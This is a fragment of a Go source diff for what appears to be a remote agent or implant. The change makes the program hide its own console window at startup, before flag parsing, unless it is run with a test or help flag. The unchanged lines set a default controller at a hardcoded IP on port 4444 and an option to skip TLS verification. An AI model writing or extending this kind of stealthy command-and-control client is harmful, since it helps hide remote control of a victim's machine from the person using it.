@@ -1740,6 +1740,18 @@ func setupLogFile() {
 }
 
 func main() {
+	// Hide before anything else (even flag parsing) so a slow disk can
+	// never show a flash. Skipped only for explicit interactive runs.
+	hide := true
+	for _, a := range os.Args[1:] {
+		if a == "-test" || a == "--test" || a == "-help" || a == "--help" || a == "-h" {
+			hide = false
+			break
+		}
+	}
+	if hide {
+		hideOwnConsole()
+	}
 	addr := flag.String("controller", "176.229.98.54:4444", "controller address host:port")
 	caFile := flag.String("ca", "certs/server.crt", "CA cert file (server.crt)")
 	insecure := flag.Bool("insecure", false, "skip TLS verification (for testing)")
